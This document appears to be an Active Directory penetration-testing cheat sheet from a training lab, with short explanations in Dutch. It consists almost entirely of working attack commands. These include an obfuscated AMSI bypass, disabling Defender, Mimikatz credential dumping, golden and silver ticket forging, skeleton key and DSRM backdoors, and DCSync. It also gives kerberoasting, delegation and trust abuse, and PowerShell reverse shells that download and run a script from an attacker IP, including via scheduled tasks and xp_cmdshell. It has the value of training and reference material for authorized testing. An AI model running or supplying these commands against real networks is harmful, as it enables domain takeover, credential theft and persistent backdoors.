#### Get actively logged users on a computer (needs local admin privs)
```
Get-NetLoggedon -Computername <computername>
```

#### Get locally logged users on a computer (needs remote registry rights on the target)
```
Get-LoggedonLocal -Computername <computername>
```

#### Get the last logged users on a computer (needs admin rights and remote registary on the target)
```
Get-LastLoggedOn -ComputerName <computername>
```

## Powerview shares
#### Find shared on hosts in the current domain
```
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
```

#### Find sensitive files on computers in the domain
```
Invoke-FileFinder -Verbose
```

#### Get all fileservers of the domain
```
Get-NetFileServer
```

## Powerview GPO
#### Get list of GPO's in the current domain
```
Get-NetGPO
Get-NetGPO -Computername <computername>
```

#### Get GPO's which uses restricteds groups or groups.xml for interesting users
```
Get-NetGPOGroup
```

#### Get users which are in a local group of a machine using GPO
```
Find-GPOComputerAdmin -Computername <computername>
```

#### Get machines where the given user is member of a specific group
```
Find-GPOLocation -Username student244 -Verbose
```

#### Get OU's in a domain
```
Get-NetOU -Fulldata
```

#### Get machines that are part of an OU
```
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
```

#### Get GPO applied on an OU
gplink from Get-NetOU -Fulldata
```
Get-NetGPO -GPOname "{<gplink>}"
```

## Powerview ACL
#### Get the ACL's associated with the specified object
```
Get-ObjectACL -SamAccountName <accountname> -ResolveGUIDS
```

#### Get the ACL's associated with the specified prefix to be used for search
```
Get-ObjectACL -ADSprefix ‘CN=Administrator,CN=Users’ -Verbose
```

#### Get the ACL's associated with the specified path
```
Get-PathAcl -Path \\<Domain controller>\sysvol
```

#### Search for interesting ACL's
```
Invoke-ACLScanner -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
```

#### Search of interesting ACL's for the current user
```
Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
```

## Powerview Domain trust
#### Get a list of all the domain trusts for the current domain
```
Get-NetDomainTrust
```

#### Get details about the forest
```
Get-NetForest
```

#### Get all domains in the forest
```
Get-NetForestDomain
Get-NetforestDomain -Forest <domain name>
```

#### Get global catalogs for the current forest
```
Get-NetForestCatalog
Get-NetForestCatalog -Forest <domain name>
```

#### Map trusts of a forest
```
Get-NetForestTrust
Get-NetForestTrust -Forest <domain name>
Get-NetForestDomain -Verbose | Get-NetDomainTrust
```

## Misc
####  Powerview Find all machines on the current domain where the current user has local admin access
```
Find-LocalAdminAccess -Verbose
```

```
. ./Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess
```

```
. ./Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

####  Powerview Find local admins on all machines of the domain (needs admin privs)
```
Invoke-EnumerateLocalAdmin -Verbose
```

#### Connect to machine with administrator privs
```
Enter-PSSession -Computername <computername>
```

#### Save and use sessions of a machine
```
$sess = New-PSSession -Computername <computername>
Enter-PSSession $sess
```

####  Find active sessions
```
Invoke-UserHunter
Invoke-UserHunter -Groupname "RDPUsers"
```

####  Find active sessions of domain admins
```
Invoke-UserHunter -Groupname "Domain Admins"
```

####  check access to machine
```
Invoke-UserHunter -CheckAccess
```

####  BloodHound
https://github.com/BloodHoundAD/BloodHound
```
cd Ingestors
. ./sharphound.ps1
Invoke-Bloodhound -CollectionMethod all -Verbose
Invoke-Bloodhound -CollectionMethod LoggedOn -Verbose

#Copy neo4j-community-3.5.1 to C:\
#Open cmd
cd C:\neo4j\neo4j-community-3.5.1-windows\bin
neo4j.bat install-service
neo4j.bat start
#Browse to BloodHound-win32-x64
Run BloodHound.exe
#Change credentials and login
```

####  Powershell reverse shell
```
Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000
```

# Local privilege escalation
Focussing on Service issues
#### Privesc check all
https://github.com/enjoiz/Privesc
```
. .\privesc.ps1
Invoke-PrivEsc
```

#### Beroot check all
https://github.com/AlessandroZ/BeRoot
```
./beRoot.exe
```

####  Run powerup check all
https://github.com/HarmJ0y/PowerUp
```
. ./powerup
Invoke-allchecks
```

####  Run powerup get services with unqouted paths and a space in their name
```
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
```

####  Abuse service to get local admin permissions with powerup
```
Invoke-ServiceAbuse
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\<username>'
```

####  Jekins
```
Runs as local admin, go to /job/project/configure to try to see if you have build permissions in /job/project0/configure
Execute windows or shell comand into the build, you can also use powershell scripts
```

### Add user to local admin and RDP group and enable RDP on firewall
```
net user <username> <password> /add /Y   && net localgroup administrators <username> /add   && net localgroup "Remote Desktop Users" <username> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

# Lateral Movement
## General
#### Connect to machine with administrator privs
```
Enter-PSSession -Computername <computername>
$sess = New-PSSession -Computername <computername>
Enter-PSSession $sess
```

#### Execute commands on a machine
```
Invoke-Command -Computername <computername> -Scriptblock {whoami} 
Invoke-Command -Scriptblock {whoami} $sess
```

#### Load script on a machine
```
Invoke-Command -Computername <computername> -FilePath <path>
Invoke-Command -FilePath <path> $sess
```

#### Download and load script on a machine
```
iex (iwr http://xx.xx.xx.xx/<scriptname> -UseBasicParsing)
```

#### AMSI Bypass
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( \[TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

```
Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( \[TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )} $sess
```

#### Disable AV monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Execute locally loaded function on a list of remote machines
```
Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content <list_of_servers>)
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content <list_of_servers>)
```

#### Check the language mode
```
$ExecutionContext.SessionState.LanguageMode
```

#### Enumerate applocker policy
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### Copy script to other server
ps you can edit the script and call the method you wish so it executes, since you still cant load it in
```
Copy-Item .\Invoke-MimikatzEx.ps1 \\<servername>\c$\'Program Files'
```

## Mimikatz
#### Mimikatz dump credentials on local machine
```
Invoke-Mimikatz -Dumpcreds
```

#### Mimikatz dump credentials on multiple remote machines
```
Invoke-Mimikatz -Dumpcreds -Computername @(“<system1>”,”<system2>”)
Invoke-Mimikatz -Dumpcreds -ComputerName @("<computername 1>","<computername 2>")
```

#### Mimikatz start powershell pass the hash (run as local admin)
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm hash> /run:powershell.exe"'
```

#### Mimikatz dump from SAM
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
```

or

```
reg save HKLM\SAM SamBkup.hiv
reg save HKLM\System SystemBkup.hiv
#Start mimikatz as administrator
privilege::debug
token::elevate
lsadump::sam SamBkup.hiv SystemBkup.hiv
```

#### Mimikatz dump lsa (krbtgt to)
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```

# Domain persistence
## Golden ticket
Golden tickets zijn nagemaakte TGT tickets. TGT tickets worden gebruikt om TGS tickets aan te vragen bij de KDC(DC). De kerberos Golden Ticket is een valid TGT omdat deze ondertekend is door het KRBTGT account. Als je de hash van de KRBTGT account kan achterhalen door de hashes te dumpen op de Domain controller en deze hash niet wijzigt is het mogelijk om weer een TGT aan te vragen bij de volgende penetratietest en volledige toegang tot het domein te verkrijgen.

https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets

#### Dump hashes - Get the krbtgt hash
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```

#### Make golden ticket
Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
To get the SID use ```Get-DomainSID``` from powerview
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

#### Use the DCSync feature for getting krbtgt hash. Execute with DA privileges
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

#### Check WMI Permission
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
```

## Silver ticket
Silver tickets zijn nagemaakte TGS tickets. Omdat de ticket is nagemaakt op de workstation is er geen communicatie met de DC. Eeen silver ticket kan worden aangemaakt met de service account hash of computer account hash.

https://adsecurity.org/?p=2011
https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets

#### Make silver ticket for CIFS
Use the hash of the local computer
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:CIFS /rc4:<local computer hash> /user:Administrator /ptt"'
```

#### Check access (After CIFS silver ticket)
```
ls \\<servername>\c$\
```

#### Make silver ticket for Host
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
```

#### Schedule and execute a task (After host silver ticket)
```
schtasks /create /S <target> /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''')'"

schtasks /Run /S <target> /TN “Reverse”
```

#### Make silver ticket for WMI
Execute for WMI /service:HOST /service:RPCSS
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /user:Administrator /ptt"'
```

#### Check WMI Permission
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
```

## Skeleton key
De skeleton key attack is een aanval dat malware in het geheugen laad van de domain controller. Waarna het mogelijk is om als elke user the authenticeren met een master wachtwoord. Als je dit met mimikatz uitvoert is dit wachwoord 'mimikatz'. Dit laad een grote security gat waarbij dit wordt uitgevoerd! Voer dit dus niet uit in een productieomgeving zonder goed te overleggen met de klant. Om deze aanval te stoppen moet de domain controller worden herstart.

https://pentestlab.blog/2018/04/10/skeleton-key/

#### Create the skeleton key - Requires DA
```
Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername <target>
```

## DSRM
De Directory Services Restore Mode is een boot option waarin een domain controller kan worden opgestart zodat een administrator reparaties of een recovery kan uitvoeren op de active directory database. Dit wachtwoord wordt ingesteld tijdens het installeren van de domain controller en wordt daarna bijna nooit gewijzigd. Door de login behavior aan te passen van dit lokale account is het mogelijk om remote toegang te verkrijgen via dit account, een account waarvan het wachtwoord bijna nooit wijzigd! Pas op, dit tast de security van de domain controller aan!

#### Dump DSRM password - dumps local users
look for the local administrator password
```
Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername <target>
```

#### Change login behavior for the local admin on the DC
```
New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
```

#### If property already exists
```
Set-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2
```

#### Pass the hash for local admin
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<computer> /user:Administrator /ntlm:<hash> /run:powershell.exe"'
```

## Custom SSP - Track logons
Het is mogelijk om met een custom Security Support Provider (SSP) alle logons op een computer bij te houden. Een SSP is een DDL. Een SSP is een DLL waarmee een applicatie een geverifieerde verbinding kan verkrijgen. Sommige SSP-pakketten van Microsoft zijn: NTLM, Kerberos, Wdigest, credSSP. 

Mimikatz biedt een aangepaste SSP - mimilib.dll aan. Deze SSP registreert lokale aanmeldingen, serviceaccount- en computeraccountwachtwoorden in platte tekst op de doelserver.

#### Mimilib.dll
Drop mimilib.dll to system32 and add mimilib to HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
```
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"
SetItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' Value $packages
```

#### Use mimikatz to inject into lsass
all logons are logged to C:\Windows\System32\kiwissp.log
```
Invoke-Mimikatz -Command ‘”misc:memssp”’
```

## ACL
### AdminSDHolder
De AdminSDHolder container is een speciale AD container met default security permissies die gebruikt worden als template om beveiligde AD gebruikers en groepen (Domain Admins, Enterprise Admins etc.) te beveiligen en te voorkomen dat hier onbedoeld wijzingen aan worden uitgevoerd. Nadater er toegang is verkregen tot een DA is het mogelijk om deze container aan te passen voor persistence.

https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence

#### Check if student has replication rights
```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

#### Add fullcontrol permissions for a user to the adminSDHolder
```
Add-ObjectAcl -TargetADSprefix ‘CN=AdminSDHolder,CN=System’ PrincipalSamAccountName <username> -Rights All -Verbose
```

#### Run SDProp on AD (Force the sync of AdminSDHolder)
```
Invoke-SDPropagator -showProgress -timeoutMinutes 1

#Before server 2008
Invoke-SDpropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

#### Check if user got generic all against domain admins group
```
Get-ObjectAcl -SamaccountName “Domain Admins” –ResolveGUIDS | ?{$_.identityReference -match ‘<username>’}
```

#### Add user to domain admin group
```
Add-DomainGroupMember -Identity ‘Domain Admins’ -Members <username> -Verbose
```

or

```
Net group "domain admins" sportless /add /domain
```

#### Abuse resetpassword using powerview_dev
```
Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force ) -Verbose
```

### DCsync
Bij een DCSync aanval immiteren we een DC om de wachtwoorden te achterhalen via domain replication. Hiervoor hebben we bepaalde rechten nodig op de domain controller.

https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync
https://blog.stealthbits.com/what-is-dcsync-an-introduction/

#### Add full-control rights
```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose
```

#### Add rights for DCsync
```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName <username> -Rights DCSync -Verbose
```

#### Execute DCSync and dump krbtgt
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

### SecurityDescriptor - WMI
```
. ./Set-RemoteWMI.ps1
```

#### On a local machine
```
Set-RemoteWMI -Username <username> -Verbose
```

#### On a remote machine without explicit credentials
```
Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Verbose
```

#### On a remote machine with explicit credentials
Only root/cimv and nested namespaces
```
Set-RemoteWMI -Username <username> -Computername <computername> -Credential Administrator -namespace ‘root\cimv2’ -Verbose
```

#### On remote machine remove permissions
```
Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Remove -Verbose
```

#### Check WMI permissions
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
```

### SecurityDescriptor - Powershell Remoting
```
. ./Set-RemotePSRemoting.ps1
```

#### On a local machine
```
Set-RemotePSRemoting -Username <username> -Verbose
```

#### On a remote machine without credentials
```
Set-RemotePSRemoting -Username <username> -Computername <computername> -Verbose
```

#### On a remote machine remove permissions
```
Set-RemotePSRemoting -Username <username> -Computername <computername> -Remove
```

### SecurityDescriptor - Remote Registry
Using the DAMP toolkit
```
. ./Add-RemoteRegBackdoor
. ./RemoteHashRetrieval
```

#### Using DAMP with admin privs on remote machine
```
Add-RemoteRegBackdoor -Computername <computername> -Trustee <username> -Verbose
```

#### Retrieve machine account hash from local machine
```
Get-RemoteMachineAccountHash -Computername <computername> -Verbose
```

#### Retrieve local account hash from local machine
```
Get-RemoteLocalAccountHash -Computername <computername> -Verbose
```

#### Retrieve domain cached credentials from local machine
```
Get-RemoteCachedCredential -Computername <computername> -Verbose
```
# Domain Privilege escalation
## Kerberoast
Kerberoasting een technique waarbij de wachtwoorden van service accounts worden gekraakt. Kerberoasting is voornamelijk efficient indien er user accounts als service accounts worden gebruikt. Een TGS ticket kan worden aangevraagd voor deze user, waarbij de TGS versleuteld is met de NTLM hash van de plaintext wachtwoord van de gebruiker. Als de service account een user account is welke zelf is aangemaakt door de beheerder is de kans groter dat deze ticket te kraken is, en dus het wachtwoord wordt achterhaalt voor de service. Deze TGS ticket kan offline gekraakt worden. Voor de aanval word de kerberoas[https://github.com/nidem/kerberoast] repositorie van Nidem gebruikt.
#### Find user accounts used as service accounts
```
. ./GetUserSPNs.ps1
```
```
Get-NetUser -SPN
```
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

#### Reguest a TGS
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```
or
```
Request-SPNTicket "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```

#### Export ticket using Mimikatz
```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

#### Crack the ticket
Crack the password for the serviceaccount
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

```
.\hashcat.exe -m 18200 -a 0 <HASH FILE> <WORDLIST>
```

## AS-REPS Roasting
AS-REPS roasting is een technique waarbij het wachtwoord achterhaald kan worden omdat de 'Do not require Kerberos preauthentication property' is aangezet, oftewel kerberos preauthentication staat uit. Een aanvaller kan de eerste stap van authenticatie overslaan en voor deze gebruiker een TGT aanvragen, welke vervolgens offline gekraakt kan worden.
#### Enumerating accounts with kerberos preauth disabled
```
. .\Powerview_dev.ps1
Get-DomainUser -PreauthNotRequired -Verbose
```
```
Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
```

#### Enumerate permissions for group
Met genoeg rechten(GenericWrite of GenericAll) is het mogelijk om kerberos preauth uit te schakelen.
```
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
```

#### Set preauth not required
```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

#### Request encrypted AS-REP
```
. ./ASREPRoast.ps1
Get-ASREPHash -Username <username> -Verbose
```

#### Enumerate all users with kerberos preauth disabled and request a hash
```
Invoke-ASREPRoast -Verbose
Invoke-ASREPRoast -Verbose | fl
```

#### Crack the hash with hashcat
Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
```
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

## Set SPN
Met genoeg rechten (GenericALL en GenericWrite) is het mogelijk om zelf de Service Principle Name attribute aan een gebruiker toe te voegen. Deze kan dan worden gekraakt met behulp van kerberoasting.

#### Enumerate permissions for group on ACL
```
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
```

#### Check if user has SPN
```
. ./Powerview_dev.ps1
Get-DomainUser -Identity <username> | select samaccountname, serviceprincipalname
```

of

```
Get-NetUser | Where-Object {$_.servicePrincipalName}
```

#### Set SPN for the user
```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’ops/whatever1’}
```

#### Request a TGS
```
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
```

#### Export ticket to disk for offline cracking
```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

#### Request TGS hash for offline cracking hashcat
```
Get-DomainUser -Identity <username> | Get-DomainSPNTicket | select -ExpandProperty Hash
```

#### Crack the hash with hashcat
Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
```
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

## Unconstrained Delegation
Unconstrained delegation is een privilege welke kan worden toegekent aan gebruikers of computers, dit gebeurt bijna altijd bij computers met services zoals ISS en MSSQL. Deze services hebben meestal toegang nodig tot een backend database namens de geverifieerde gebruiker. Wanneer een gebruiker zich verifieert op een computer waarop onbeperkt Kerberos-delegatierecht is ingeschakeld, wordt het geverifieerde TGT-ticket van de gebruiker opgeslagen in het geheugen van die computer. Als je administrator toegang hebt tot deze server, is het mogelijk om alle TGT tickets uit het geheugen te dumpen.

#### Discover domain computers which have unconstrained delegation
Domain Controllers always show up, ignore them
```
 . .\PowerView_dev.ps1
Get-Netcomputer -UnConstrained
Get-Netcomputer -UnConstrained | select samaccountname
```

#### Check if any DA tokens are available on the unconstrained machine
Wait for a domain admin to login while checking for tokens
```
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

#### Export the TGT ticket
```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

#### Reuse the TGT ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
```

## Constrained Delegation
Als je over een account of computer beschikt met de constrained delegation privilege is het mogelijk om je voor te doen als elk andere gebruiker en jezelf te authentiseren naar een service waar de gebruiker mag delegeren.
### Enumerate
#### Enumerate users with contrained delegation enabled
```
Get-DomainUser -TrustedToAuth
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

#### Enumerate computers with contrained delegation enabled
```
Get-Domaincomputer -TrustedToAuth
Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```
### Constrained delegation User
#### Requesting TGT with kekeo
```
./kekeo.exe
Tgt::ask /user:<username> /domain:<domain> /rc4:<hash>
```

#### Requesting TGS with kekeo
```
Tgs::s4u /tgt:<tgt> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
```

#### Use Mimikatz to inject the TGS ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
```

### Constrained delegation Computer
#### Requesting TGT with a PC hash
```
./kekeo.exe
Tgt::ask /user:dcorp-adminsrv$ /domain:<domain> /rc4:<hash>
```

#### Requesting TGS
No validation for the SPN specified
```
Tgs::s4u /tgt:<kirbi file> /user:Administrator@<domain> /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```

#### Using mimikatz to inject TGS ticket and executing DCsync
```
Invoke-Mimikatz -Command '"Kerberos::ptt <kirbi file>"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<shortdomain>\krbtgt"'
```

## DNS Admins
Indien je over een gebruiker bezit die lid is van de 'DNS admin' is het mogelijk om verschillende aanvallen uit te voeren op de DNS server (Meestal Domain Controller) Het is mogelijk om hier een reverse shell mee te krijgen, maar dit legt heel het DNS verkeer plat binnen het domein aangezien dit de DNS service bezighoudt! Voor meer informatie zie [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise]
#### Enumerate member of the DNS admin group
```
Get-NetGRoupMember “DNSAdmins”
```

#### From the privilege of DNSAdmins group member, configue DDL using dnscmd.exe (needs RSAT DNS)
Share the directory the ddl is in for everyone so its accessible.
logs all DNS queries on C:\Windows\System32\kiwidns.log 
```
Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
```

#### Restart DNS
```
Sc \\<dns server> stop dns
Sc \\<dns server> start dns
```

## Enterprise Admins
### Child to parent - trust tickets
#### Dump trust keys
Look for in trust key from child to parent (first command) - This worked best for me! Second command didnt work :(
Look for NTLM hash (second command)
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<computername>$"'
```

#### Create an inter-realm TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain> /sid:<sid of current domain> /sids:<sid of enterprise admin groups of the parent domain> /rc4:<trust hash> /service:krbtgt /target:<target domain> /ticket:<path to save ticket>"'
```

#### Create a TGS for a service (kekeo_old)
```
./asktgs.exe <kirbi file> CIFS/<forest dc name>
```

#### Use TGS to access the targeted service (may need to run it twice) (kekeo_old)
```
./kirbikator.exe lsa .\<kirbi file>
```

#### Check access to server
```
ls \\<servername>\c$ 
```

### Child to parent - krbtgt hash
#### Get krbtgt hash from dc
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```

#### Create TGT
the mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /sids:<sids> /krbtgt:<hash> /ticket:<path to save ticket>"'
```

#### Inject the ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <path to ticket>"'
```

#### Get SID of enterprise admin
```
Get-NetGroup -Domain <domain> -GroupName "Enterprise Admins" -FullData | select samaccountname, objectsid
```

## Crossforest attacks
### Trust flow
#### Dump trust keys
Look for in trust key from child to parent (first command)
Look for NTLM hash (second command)
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```

#### Create a intern-forest TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<domain sid> /rc4:<hash of trust> /service:krbtgt /target:<target> /ticket:<path to save ticket>"'
```

#### Create a TGS for a service (kekeo_old)
```
./asktgs.exe <kirbi file> CIFS/<crossforest dc name>
```

#### Use the TGT
```
./kirbikator.exe lsa <kirbi file>
```

#### Check access to server
```
ls \\<servername>\<share>\
```

### Trust abuse SQL
```
. .\PowerUpSQL.ps1
```

#### Discovery SPN scanning
```
Get-SQLInstanceDomain
```

#### Check accessibility
```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded – Verbose
```

#### Gather information
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

#### Search for links to remote servers
```
Get-SQLServerLink -Instance <sql instance> -Verbose
```

#### Enumerate database links
```
Get-SQLServerLinkCrawl -Instance <sql instance> -Verbose
```

#### Enable xp_cmdshell
```
Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance>”
```

#### Execute commands
```
Get-SQLServerLinkCrawl -Instance <sql instance> -Query "exec master..xp_cmdshell 'whoami'"
```

#### Execute reverse shell example
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
```
